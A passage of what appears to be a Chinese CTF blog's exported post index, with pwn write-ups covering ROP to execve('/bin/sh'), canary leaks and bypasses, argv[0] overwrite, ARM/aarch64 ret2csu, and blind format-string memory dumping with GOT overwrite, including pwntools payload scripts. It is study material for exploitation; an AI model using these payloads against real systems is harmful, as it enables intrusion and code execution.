p32(0x200)+p32(0x080d7200)+p32(0x0)\npayload += p32(pop_eax_ret) + p32(0x3)\npayload += p32(int0x80)\n\n#execve(\"/bin/sh\",0,0)\npayload += p32(pop_edx_ecx_ebx_ret)\npayload += p32(0x0)+p32(0x0)+p32(0x080d7200)\npayload += p32(pop_eax_ret) + p32(0xb)\npayload += p32(int0x80)\n```\n\n其他的就是找ROP了，这个不说了，这里能找到这么多gadget，纯粹就是因为程序是静态的，gadget无敌多，如果不是静态的，可能还得费一番功夫。\n\n参考资料：\n\nhttps://www.dazhuanlan.com/bob24/topics/1295510\n\n \n\n \n","tags":["mimic"],"categories":["PWN","pwn题型"]},{"title":"32C3 CTF-readme","url":"/2021/08/19/32C3 CTF-readme/","content":"\n1.常规checksec，开了NX,Canary,FORTIFY。然后IDA找漏洞，sub_4007E0函数中第一次输入名字时存在栈溢出：\n\n```\n#注释头\n\n__int64 v3; // [rsp+0h] [rbp-128h]\n--------------------------------------------------------------------\n_IO_gets(&v3)\n```\n\n2.研究程序，有数据byte_600D20提示，点进去提示远程会读取flag到这个地方，由于这里有Canary和栈溢出，那么我们直接利用Canary的检查函数___stack_chk_fail来泄露程序中byte_600D20处的flag。\n\n3.前置知识：\n\n(1)libc2.24及以下的___stack_chk_fail函数检查到canary被修改后，会在程序结束时打印*** stack smashing detected** ”：[**./readme.bin]** terminate。这里红色的部分就是程序名字，程序初始化时就会读入存储到argv[0]这个参数里面。\n\n(需要注意的是，程序最开始读入的是程序的pwd绝对路径，类似于/home/ctf/readme.bin，之后会在___stack_chk_fail函数中对argv[0]中保存的字符串进行拆解，从而只打印出程序名字)\n\n(2)由于argv[0]参数是main函数的参数，程序初始化时就存储在栈上的较高地址处，我们的输入肯定是在main函数及以后的函数栈中，基本都处于较低地址处，所以一旦栈溢出足够，那么就可以覆盖到argv[0]，从而将___stack_chk_fail函数打印程序名字的地方覆盖成我们想要知道的某个地址中的值，这里也就是flag，byte_600D20。\n\n4.所以进行足够长度的覆盖，将argv[0]覆盖为0x600d20，但是由于以下函数\n\n```\n#注释头\n\nbyte_600D20[v0++] = v1;\n--------------------------------------------------------------------------\nmemset((void *)((signed int)v0 + 0x600D20LL), 0, (unsigned int)(32 - v0));\n```\n\n即使我们覆盖掉了argv[0]，那么打印出来的也不会是flag。这里需要用到另一个知识点：\n\n▲动态加载器根据程序头将程序映射到内存，由于程序没开PIE，所以各段的加载地址均已经固定，flag位于0x600D20，处于第二个LOAD中，会被映射到内存中的第一个LOAD中，所以0x600D20处的flag即使被覆盖，那么第一个LOAD中的flag依然存在。所以这里选择将argv[0]覆盖为第一个LOAD中的flag。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521279.jpeg)\n\n第一个LOAD中的flag寻找方法，peda可以查找到：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521727.jpeg)\n\n5.现在考虑寻找argv[0]的位置，由于最开始读取的是pwd绝对路径，所以利用这个来寻找，将断点下在b *0x40080E，这里我的绝对路径是/ctf/AAAAAAAA：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521224.jpeg)\n\n上图中画红线的两段都有可能是，都尝试一下，可以知道相差536字节，也就是第一条红线才是正确的。\n\n简单方法：直接用pwndbg>p &__libc_argv[0]\n\n6.尝试编写payload:\n\n```\n#注释头\n\npayload = \"\"\npayload += \"A\"*0x218\npayload += p64(flag_addr) #覆盖argv[0]\n```\n\n却发现没办法打印出来，连*** stack smashing detected ***都没办法接受到，那么肯定是远程的环境变量将stderr错误输出流设置为0，只打印在远程本地。这里用socat搭建一下，可以验证出来，远程本地上能打印出来：\n\n*** stack smashing detected ***: 32C3_TheServerHasTheFlagHere... terminated\n\n7.那么如果想通过该方法获取远程打印的flag，就需要将远程的环境变量stderr设置为1，也就是LIBC_FATAL_STDERR_=1。那么如何修改远程的环境变量呢，可以再通过gdb调试，输入stack 100：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521326.jpeg)\n\n这里的536就是所在argv[0]，再看下下面的一些数据，552，556都是环境变量，那么在远程肯定是需要调用的，这里选择修改552处的环境变量。那么之后又如何将LIBC_FATAL_STDERR_=1传过去呢？这里就想到程序有第二个输入，本来用来覆盖0x600D20的就可以被利用了。通过第二次输入将LIBC_FATAL_STDERR_=1传过去，保存在0x600D20前面部分，之后将552处的内容修改为0x600D20，这样环境变量就被更改了。\n\n8.总Payload:\n\n```\n#注释头\n\npayload = \"\"\npayload += \"A\"*0x218\npayload += p64(0x400D20) #覆盖argv[0]\npayload += p64(0)\npayload += p64(0x600D20) #覆盖环境变量envp指针\n```\n\n9.发送完payload后再发送LIBC_FATAL_STDERR_=1就可以将flag打印在本地了。\n\n \n\n参考资料：\n\n比较多，网上不太全，这个比较全\n\nhttps://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200\n","tags":["canary"],"categories":["PWN","canary绕过0x9"]},{"title":"ARM基础","url":"/2021/08/19/ARM基础/","content":"\n一、前置环境：\n\n先说明一下aarch64就是arm指令架构的64位版本，有相同，也有不同的地方。而Thumb指令集基本就相当于16位版本arm指令架构。\n\n1.安装交叉编译环境：\n\n```bash\n#注释头\n\nsudo apt-get install gcc-arm-linux-gnueabi\nsudo apt-get install gcc-aarch64-linux-gnu\n```\n\n然后就正常编译即可\n\n```bash\n#注释头\n\narm-linux-gnueabi-gcc file.c -o file\naarch64-linux-gnu-gcc file.c -o file\n```\n\n2.安装运行环境：\n\n```bash\n#注释头\n\nsudo apt-get install g++-arm-linux-gnueabihf\nsudo apt-get install pkg-config-aarch64-linux-gnu\n```\n\n这样对于静态的arm架构文件可以用qemu直接运行了，当然需要qemu对应支持。\n\n3.调试文件：\n\n(1)qemu运行起来\n\n```bash\n#注释头\n\nqemu-arm -g 12345 -L /usr/arm-linux-gnueabi/ ./file\nqemu-aarch64 -g 12345 -L /usr/aarch64-linux-gnu/ ./file\n```\n\n这里-g代表端口映射的意思，用来配合外面的gdb，这里用到端口12345。\n\n-L代表加载运行库，这里安装运行环境之后基本都在这个位置/usr/...../。\n\n(2)gdb远程附加调试：\n\n```bash\n#注释头\n\ngdb-multiarch -q ./file\ntarget remote localhost:12345\n```\n\n这里不设置set architecture arm  set architecture aarch64也行的。\n\n之后就正常调试，不过中途断下来需要在qemu运行的终端地方ctrl+c，而不是gdb处。\n\n \n\n二、基础学习：\n\n1.寄存器：\n\nARM中：(32位版本)\n\n![32](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs32.png)\n\nAARCH64中：(64位版本)\n\n![64](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs64.png)\n\n(1)R0~R3：函数调用参数，代表第0~4个参数，剩下的参数从右向左依次入栈，函数返回值保存在R0中。(对应在aarch64中为R0~R7，但是gdb调试或者IDA中一般显示X0~X30，同时还有低32位的W0~W30)\n\n(2)SP：类似rsp,esp，栈指针\n\n(3)FP：类似ebp，栈指针\n\n(4)LR：当发生函数调用时，会保存调用函数处的地址，退出函数时赋值给PC。\n\n(5)PC：类似eip,rip，存储下一条指令的地址。\n\n \n\n2.基础指令：\n\n(1)STM以及LDM是指令前缀，表示多寄存器寻址，来装载和存储多个字的数据到内存，后面加上不同的后缀代表不同的指令，类似的有STMFA,STMIB, LDMFA,LDMDA等等：\n\n常见的有FD，代表满栈转存，ED代表空栈转存。\n\n▲满栈和空栈：满栈操作时SP指向上次写的最后一个数据单元，而空栈的栈指针SP指向第一个空闲单元。\n\n类似有STMFD SP! { }和LDMFD SP! { }：\n\n即相当于push和pop，在gdb中显示push，pop，IDA中显示STMFD和LDMFD。\n\nSTMFD  SP!, {R11,LR}：将R11和LR入栈，相当于push R11以及LR中保存的值入栈。\n\n同理LDMFD即相当于pop。\n\n(2).STR指令：将前操作数寄存器数据复制到后操作数地址对应的内存上，类似mov\n\nSTR  r3, [fp, #-0xc]：将寄存器r3中的值赋给fp-0xc地址对应的内存。这里fp就是R11。\n\nSTR  r3, place：这里是赋值给pc+place地址对应内存。\n\n等等….\n\n(数据复制方向：前->后)\n\n(3).LDR指令：也是指令前缀，后面也会跟上一些不同的后缀，常见有LDRB，LDRH等等。\n\nLDR R0，[R1,＃8]：将r1+8地址对应内存复制给r0。\n\n(数据复制方向：后->前)\n\n(4).B：跳转指令，同样也是类似一个前缀指令\n\n① B：直接跳转，目标地址是相对于当前PC值的偏移地址\n\n② BL：跳转之前会把PC值存到R14（LR）寄存器中，通常用于函数调用，从被调用函数返回时，通常需要用到BX LR;或者MOV PC,LR;等\n\n③BX：跳转到ARM指令或者Thumb指令\n\n④BLX：结合了BL和BX两个指令的功能。\n\n \n\n三、ARM(32位架构)函数分类：\n\n1.叶子函数：不做任何其他函数调用的函数\n\n调用时的栈状态分析：和正常的x86差不多，压入fp，sub sp开辟栈空间。最后通过Add sp,fp,#0和pop{fp}再加上BX LR来返回。\n\n![arm3](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsarm3.png)\n\n![arm4](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsarm4.png)\n\n\n\nFP中的内容是上一个函数栈的FP指针，并且栈上不存在存放返回地址的地方，无法直接劫持返回地址。\n\n▲栈模型如下：\n\n```\n#注释头\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|  Last FP    | <- frame pointer\n+-------------+\n```\n\n但是这样就不好利用，那么就尝试劫持栈迁移一段距离，使得上一个非叶子函数的剩下的汇编代码所用到的栈上数据是我们伪造的栈中的数据，这样就能完成劫持上一个非叶子函数的返回地址。需要对汇编有一定功力。\n\n2.非叶子函数：多了一点不同，即会压入FP时，将LR也压入，且LR先于FP压入，即函数栈中的FP指向的是保存的LR，而不是叶子函数中指向的是上一个函数栈的FP。最后通过sub sp,fp,#4加上pop {fp,pc}来返回。\n\n▲其实返回时add和sub没多大差别，只针对后两个操作数的，也就立即数的符号相反呗，后两个操作数计算完成后赋值给sp实现栈还原。\n\n▲栈模型如下：\n\n```\n#注释头\n\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n| return_addr | <- frame pointer\n+-------------+\n|  Last FP    |\n+-------------+\n```\n\n虽然FP中的内容实际上是LR的内容,但其实也差不多，反正最后返回时都会发生SP移动，先取FP，再取对应的PC，所以实际怎么样也无所谓了：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191437383.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191437497.png)\n\n这样就相当于常规的32位栈模型ebp-eip了，只不过不涉及参数，一般需要用gadget来为对应参数赋值。\n\n在常规栈溢出时，这里发挥重要作用的就是gadgets_addr了，一般可以先ROPgadget --binary ./pwn --only \"pop\"，查找对应的pop gadget。例如这里可以有pop {r0, r4, pc}，那么完成利用的栈模型就如下：\n\n```\n#注释头\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|  padding    | <- frame pointer\n+-------------+\n|gadgets_addr | <- return address\n+-------------+\n|binsh_addr   |\n+-------------+\n|junk_data    |\n+-------------+\n|system_addr  |\n+-------------+\n```\n\n将binsh_addr赋值给r0，junk_data赋值给r4，system_addr赋值给pc，完成利用。\n\n★在栈溢出探索padding时，可以用pwndbg中的cyclic 200自动生成200个字符，然后输入，那么在arm(32位)架构下的非叶子函数中，一定会给pc赋值为我们的某个padding，这时候程序断下来，可以查看pc的值，用cyclic -l [PC值]来查找溢出点。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438678.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438837.png)\n\n▲所以这里如果针对非叶子函数劫持了FP和FP+4，那么就相当于劫持栈并且控制程序流了，如果想调用函数还需要设置参数寄存器r0-r3才行。\n\n简单的可以直接查找pop r0,pc之类的：ROPgadget --binary ./pwn --only \"pop\"，这种方式一般只能调用一个参数的函数。\n\n泄露地址之类的一般还是需要用到ret2csu，arm(32位)下的ret2csu一般是用到：\n\n```\n#注释头\n\n.text:0001049C                 LDR     R3, [R5],#4                 ②\n.text:000104A0                 MOV     R2, R9\n.text:000104A4                 MOV     R1, R8\n.text:000104A8                 MOV     R0, R7\n.text:000104AC                 BLX     R3                          ③\n.text:000104B0                 CMP     R6, R4\n.text:000104B4                 BNE     loc_10498\n.text:000104B8                 LDMFD   SP!, {R4-R10,PC}            ①\n```\n\n即通过①来为R4-R10赋值，以及控制PC跳转到②，再利用R5地址对应的值来赋值给R3对应跳转，期间也可通过R7-R8来控制R0-R2的参数。这里需要满足R5处保存的是got表地址，即将R5赋值为func_got_addr即可。\n\n \n\n四、aarch64架构的函数分类：其实就是ARM的64位版本，除了寄存器方面变化挺大，其他的调用方式什么的也差不了太多。\n\n1.叶子函数：不做任何其他函数调用的函数\n\n调用时的栈状态分析：和正常的arm差不多，FP入栈，sub sp开辟栈空间。最后通过Add sp,sp,#20和ret来返回。Ret相当于mov PC,LR。将LR中保存的地址给PC来执行。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438918.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438088.png)\n\n也同样通过栈劫持来控制。\n\n2.非叶子函数：也差不多，但有些不同的是，进入函数后，会先开辟栈空间，先压入LR然后压入FP。stp  x29, x30, [sp, #-0x30]!即非叶子函数栈中的FP和LR都保存在栈顶，最后通过LDP X29, X30, [SP+0x30+var_30]加上RET来返回。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438694.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439144.png)\n\n可以看到进入非叶子函数中之后，先开辟栈空间，然后压入LR，再压入FP，栈模型如下：\n\n```\n#注释头\n\n+-------------+\n| Last FP     | <- SP\n+-------------+\n| LR          |\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|Last Last FP | <- frame pointer\n+-------------+\n|Last LR      | <- return address\n+-------------+\n|binsh_addr   |\n+-------------+\n|junk_data    |\n+-------------+\n|system_addr  |\n+-------------+\n```\n\npaddint以下的部分才是我们要劫持的。\n\n所以我们在该函数中的栈溢出劫持的其实不是该函数的返回地址，而是上一个函数的返回，所以这里同时也需要确保上一个函数中汇编代码剩下的操作不会对我们覆盖的栈上的值进行重要改写，不然栈上的数据就容易被破坏。\n\n其次需要注意的是aarch64下的gadget搜索，用到：\n\nROPgadget --binary ./pwn --only \"ldp|ret\"\n\n其实是一样的，ldp就类似pop，反正gadget运用算是更加灵活了。\n\n▲通常也可以用ret2csu来搞定：\n\n```\n#注释头\n\n.text:00000000004008AC             LDR             X3, [X21,X19,LSL#3]     ②\n.text:00000000004008B0             MOV             X2, X22\n.text:00000000004008B4             MOV             X1, X23\n.text:00000000004008B8             MOV             W0, W24\n.text:00000000004008BC             ADD             X19, X19, #1\n.text:00000000004008C0             BLR             X3                      ③\n.text:00000000004008C4             CMP             X19, X20\n.text:00000000004008C8             B.NE            loc_4008AC\n.text:00000000004008CC\n.text:00000000004008CC loc_4008CC   \n.text:00000000004008CC             LDP             X19, X20, [SP,#var_s10] ①\n.text:00000000004008D0             LDP             X21, X22, [SP,#var_s20]\n.text:00000000004008D4             LDP             X23, X24, [SP,#var_s30]\n.text:00000000004008D8             LDP             X29, X30, [SP+var_s0],#0x40\n.text:00000000004008DC             RET\n```\n\n▲例如该SP即为0x40007ffe40：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439928.png)\n\n一直到0x40007ffe90为FP，那么如下\n\n```\n#注释头\n\n0x616161…         <-FP\n0x4008cc          <-LR\n```\n\n跳转0x4008CC(u_gadget1)之后，SP为0x40007ffea0依次赋值：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439548.png)\n\n再通过LDP  X29, X30, [SP+var_s0],#0x40和ret跳转到0x4008ac(u_gadget2)最终实现X0~X3赋值：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439293.png)\n\n最终跳转函数真实地址0x400090f9c8，即需要给X21赋值为read_got_addr，参数依次为read(0,0x411010,0x8)。同时需要注意的是，在read完成之后，还是会回到当前的万能gadget处0x4008C4，再接着运行下去。然后一路运行下去，经过万能gadget中的RET返回到之前设置的0x40007ffee8处也就是0x400824，这个也是在最开始就设置好的，通常可以用来返回到read函数或者main函数处再执行栈溢出，之后就正常操控程序。\n\n▲脚本示例：\n\n```python\ndef aarch64_csu(call, x0, x1, x2,ret_addr):\n    payload = p64(u_gadget1)\n    payload += \"A\"*0x8\n    payload += p64(u_gadget2)\n    payload += p64(0x0)\n    payload += p64(0x1)\n    payload += p64(call)          #got_addr\n    payload += p64(x2)\n    payload += p64(x1)\n    payload += p64(x0)\n    payload += \"B\"*0x8\n    payload += p64(ret_addr)\n    return payload\n\npayload = flat(cyclic(72)\npayload += aarch64_csu(elf.got['read'], 0, bss_addr, 8,ret_addr))\n```\n\n这个是没有栈劫持的。Aarch64的csu也不怎么用到，因为aarch64的csu赋值不是pop，SP基本不会动，而且大多时候都是SP寻址。\n\n \n\n参考资料：\n\nhttps://www.anquanke.com/post/id/199112#h3-23\n","tags":["ARM-Knowledge"],"categories":["ARM"]},{"title":"CSAW Quals CTF 2017-scv","url":"/2021/08/19/CSAW Quals CTF 2017-scv/","content":"\n1.常规checksec，开启了NX和Canary。打开IDA发现程序两个漏洞：\n\n(1)功能1中栈溢出：\n\n```\n#注释头\n\nchar buf; // [rsp+10h] [rbp-B0h]\n--------------------------------------\nv25 = read(0, &buf, 0xF8uLL);\n```\n\n(2)功能2中输出字符串：puts(&buf);\n\n注：这里的put和printf不是同一个概念，不是格式化字符串的函数。但是由于put是直接输出我们的输入，而我们的输入被保存在main函数栈上，所以可以输入足够多的数据连上canary，利用put一并打印出来，从而把canary泄露出来。\n\n2.调试，IDA中观察位置，计算偏移，可以知道偏移为0xB0-0x8=0xA8=168个字符，(canary通常被放在rbp-0x08的位置处，当然也不一定，最好还是调试一下)这样就可以构造第一个payload:payload1 = ”A”*168 + “B”。\n\n这里再加一个B是因为canary的保护机制，一般情况下canary的最后两位也就是最后一个字符都是\\x00，由于是大端序，所以可以防止不小心把canary泄露出来。因为上一个栈内存的最后第一个字符连接的是下一个栈内存的第一个字符，也就是canary中的\\x00，而打印函数默认00是字符串的结尾，所以这里如果输入”A”*168，那么打印出来的就只会是168个A，不会将canary带出来。所以我们再加一个B，覆盖掉canary在占内存的第一个字符00，从而能够连接上成为一个完整的字符串打印出来。但又由于是大端序，泄露出来的canary应该最后一个字符是B，对应\\x42，这里需要修改成\\x00从而获得正确的canary。同理，如果随机化的canary中含有\\x00，那么仍然会导致字符串截断，无法得到正确的canary。所以其实如果多执行几次，碰到包含\\x00的canary，就会导致程序出错。\n\n泄露加修改：canary = u64('\\x00'+io.recv(7))\n\n3.之后就可以利用canary的值和栈溢出，调用put函数打印其它函数的实际地址。这里程序使用了read函数，并且同时外部调用了read函数，可以通过输入read的.got表的值，使其打印read函数的真实地址。同时需要注意的是，由于是64位程序，传参是从rdi开始，所以栈溢出的第一个返回地址应该给rdi赋值才对，编写payload1。\n\n```\n#注释头\n\npayload1 = \"\"\npayload1 += \"A\"*168 #padding\npayload1 += p64(canary) #在canary应该在的位置上写canary\npayload1 += \"B\"*8 #这一段实际上是rbp的位置\npayload1 += p64(pop_rdi)   \n#跳转到pop rdi;retn;所在语句(可以通过ROPgadget查询)，来给rdi传入read函数的got表中的地址。\npayload1 += p64(read_got) #被pop rdi语句调用，出栈\npayload1 += p64(puts_plt)\n#retn到put函数的plt表，调用put函数。\npayload1 += p64(start)\n#调用之后，返回程序最开始，恢复栈帧，再执行一遍程序\n```\n\n这样就可以得到read的实际地址，从而通过libc库计算偏移地址得到基地址。\n\n5.现在有了libc库的基地址，观察main函数退出时的汇编代码：mov   eax, 0可以使用在2.24libc库条件下可以使用onegadget。\n\n6.直接计算onegadget偏移，然后覆盖main函数的返回地址，getshell。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["canary"],"categories":["PWN","canary绕过0x9"]},{"title":"Canary绕过总结","url":"/2021/08/19/Canary绕过总结/","content":"\n1.有循环时，32或者64位程序下都可以逐字节爆破绕过。\n\n2.可通过printf字符串漏洞来泄露(%p.%p.%p....)。\n\n3.通过打印栈上数据的打印函数栈溢出连上canary泄露出来。\n\n4.当程序直接读取flag进入内存时，利用函数__stack_chk_fail，加上足够长度的栈溢出覆盖argv[0]为程序中保存flag的地址。这样当__stack_chk_fail运行时就会打印出argv[0]中地址上对应的内容，也就是flag。有时候需要设置远程环境变量LIBC_FATAL_STDERR_=1，将flag打印在本地。\n\n5.由pthread出来的线程函数中如果有足够长度的栈溢出，可以直接覆盖canary来源tcbhead_t结构体中的canary和栈中的canary为同一数值，这样检查仍旧通过。\n\n(64位中为fs:[28h]，32位中为gs:[14h])\n\n▲查找方法：\n\n(1)pwndbg>catch syscall 158\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520600.jpeg)\n\n(2)查看rsi寄存器，里面存的内容就是tcbhead_t结构体的首地址。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520328.jpeg)\n\n(3)之后就可以查看canary的值：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520551.jpeg)\n\n但是这个方法好像不怎么顶用了，libc2.23及以下都行，但是libc2.27就会出现无法访问的错误，具体的原因好像是libc升级之后添加了什么东西设置了不可访问：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520546.jpeg)\n\n32位下没有arch_prctl这个系统调用了，需要看canary的生成函数调用了什么系统调用，方法类似，下断点之后查出来。\n\n★IDA中远程调试也可以查出来，利用程序开头的fs:28，找到地址，然后减去libc基地址就可以得到偏移。但是需要libc一致，偏移才会一致。而且这个偏移并不是在libc数据段上，只是程序初始化时放在后面的，所以不同的程序不同的libc都会导致偏移不一样，需要具体调试。\n\n▲长度一般为rbp+2000左右，不同的Libc版本都不太一样，需要调试才能知道。原因是通过pthread出来的线程函数栈会被安置到与TLS相差约2000字节的距离处：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520195.png)    ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520726.png)\n\n这里可以看到，第一个是main函数栈，第二个是在main函数中通过pthread进程创建并且调用的函数栈，两者相差将近0x700000000这么远，完全不是正常的函数调用相差的栈距离。同时在该函数中rbp指向的始终是0000(全是)，该函数结束后会先跳转到libc中的libpthread来恢复栈。\n\n```\n#注释头\n\n▲64位的tcbhead_t结构体：\ntypedef struct\n{\n  void *tcb;        /* Pointer to the TCB.  Not necessarily the\n               thread descriptor used by libpthread.  */\n  dtv_t *dtv;\n  void *self;       /* Pointer to the thread descriptor.  */\n  int multiple_threads;\n  int gscope_flag;\n  uintptr_t sysinfo;\n  uintptr_t stack_guard;//即为canary，fs:28h处\n  uintptr_t pointer_guard;\n  ...\n} tcbhead_t;\n```\n\n \n\n \n","tags":["pwn-Knowledge"],"categories":["PWN","canary绕过0x9"]},{"title":"Hello_World","url":"/2021/08/19/Hello_World/","content":"\n1.很简单的一个程序，IDA打开，32位程序，main函数-hello函数中\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191556311.jpeg)\n\n```\n#注释头\n\nint buf; // [esp+6h] [ebp-12h]\nread(0, &buf, 0x64u);\n```\n\nbuf距离栈底有0x12h，而可以读入的数据有0x64h，所以可以栈溢出。\n\n2.checksec一下，开了NX，不能shellcode，这里也不需要，因为我们的输入并不会被当成指令来执行。\n\n3.程序中自带后门getShell函数，并且有栈溢出，那么直接覆盖hello函数的返回地址跳转即可。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191556319.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191556326.jpeg)\n\n4.编写payload:\n\npayload = \"a\"*(0x12+0x04)  #padding\n\n(其中0x12是覆盖掉距离栈底的内容，0x04是覆盖掉hello函数返回的ebp，之后才是覆盖hello函数的返回地址)\n\npayload += p32(0x0804846B)  ##覆盖返回地址\n\n5.之后输入，然后Interactive()即可。\n\n \n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["First"],"categories":["PWN","StackOverflow0x1"]},{"title":"NJCTF2017_pingme","url":"/2021/08/19/NJCTF2017_pingme/","content":"\n1.搭建题目：socat tcp-listen:10001,fork exec:./pingme,reuseaddr &\n\n2.题目不给文件，只有地址和端口，可能是BROP也可能是格式化字符串盲打。连接上先尝试格式化字符串盲打，输入多个%p.%p.%p，可以看到泄露出了数据，那么就应该是格式化字符串盲打。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191518475.jpeg)\n\n3.首先利用爆破找到我们输入的参数偏移：\n\n```\n#注释头\n\nfrom pwn import*\nio = remote(\"127.0.0.1\",10001)\n#io = process(\"./pingme\")\n\ndef exec_fmt(payload):\n    io.sendline(payload)\n    info = p.recv()\n    return info\n\nauto = FmtStr(exec_fmt)\noffset = auto.offset\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191518534.jpeg)\n\n偏移为7，验证一下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191518484.jpeg)\n\n4.利用格式化字符串漏洞将二进制文件dump下来：\n\n```\n#注释头\n\nfrom pwn import*\n\ndef dump_memory(start_addr,end_addr):\n    result = \"\"\n    while start_addr < end_addr:\n        io = remote('127.0.0.1',10001)\n        io.recvline()\n        payload = \"%9$s.AAA\" + p32(start_addr)\n        io.sendline(payload)\n        data = io.recvuntil(\".AAA\")[:-4]\n        if data == \"\":\n            data = \"\\x00\"\n        log.info(\"leaking: 0x%x --> %s\"%(start_addr,data.encode('hex')))\n        result += data\n        start_addr += len(data)\n        io.close()\n    return result\nstart_addr = 0x8048000\nend_addr = 0x8049000\ncode_bin = dump_memory(start_addr,end_addr)\nwith open(\"code.bin\",\"wb\") as f:\n    f.write(code_bin)\n    f.close()\n```\n\n(1)由于是格式化字符串打印，会打印到字符串结尾\"\\x00\"，但是不会打印出\"\\x00\"，所以需要补上\"\\x00\"。\n\n(2)这里的%9$s.AAA中偏移为9，是因为打印的是p32(start_addr)处的内容，前面有%9$s.AAA共八个字节，两个地址单位，所以偏移7+2=9。并且填充AAA也是为了满足地址对齐，同时作为特征点来获取程序传回来的数据。将地址放在后面也是为了防止地址中的\"\\x00\"造成截断。\n\n(3)dump的内容只需要有0x1000这么大就行，一个内存页即可。\n\n(4)没有开启PIE时，32位程序从0x8048000开始。\n\n▲搭建题目时，dump出来的内容可能会有点改变，没办法gdb调试，应该是libc版本或者ASLR的问题，不过不影响，IDA静态分析就好。\n\n5.之后就是常规的格式化字符串漏洞利用了，借助dump下来的文件，找到printf的got表地址，利用格式化字符串打印printf函数真实地址。之后通过DynELF或者LibcSearch来获取system函数在libc中的偏移，利用泄露的printf函数真实地址，得到Libc加载的基地址，再计算得到system函数的真实地址。最后再利用格式化字符串漏洞将system函数真实地址写到printf的got表处，劫持got表。最后再输入binsh字符串即可劫持printf(\"/bin/sh\")为system(\"/bin/sh\")。\n\n(1)泄露printf函数真实地址:\n\n```\n#注释头\n\ndef get_printf_addr():\n    io = remote('127.0.0.1', '10001')\n    io.recvline()\n    payload = \"%9$s.AAA\" + p32(printf_got)\n    io.sendline(payload)\n    data = p.recvuntil(\".AAA\")[:4]\n    log.info(\"printf address: %s\" % data.encode('hex'))\n    return data\nprintf_addr = get_printf_addr()\n```\n\n(2)计算或者DynELF得到system函数真实地址system_addr。\n\n(3)利用格式化字符串漏洞进行attack\n\n```\npayload = fmtstr_payload(7, {printf_got:system_addr})\nio = remote('127.0.0.1', '10001')\nio.recvline()\nio.sendline(payload)\nio.recv()\nio.sendline('/bin/sh')\nio.interactive()\n```\n\n \n\n参考资料：\n\nhttps://www.dazhuanlan.com/2019/10/08/5d9c20226a067/\n\n \n","tags":["Blind"],"categories":["PWN","BlindFmstr"]},{"title":"NSCTF 2017-pwn2","url":"/2021/08/19/NSCTF 2017-pwn2/","content":"\n1.常规checksec，开启了NX和canary，IDA打开找漏洞，sub_80487FA()函数中存在两个漏洞：\n\n(1)格式化字符串漏洞：\n\n```\n#注释头\n\ns = (char *)malloc(0x40u);\nsub_804876D(&buf);\nsprintf(s, \"[*] Welcome to the game %s\", &buf);\nprintf(s)\n```\n\n(2)栈溢出漏洞：\n\n```\n#注释头\n\nread(0, &buf, 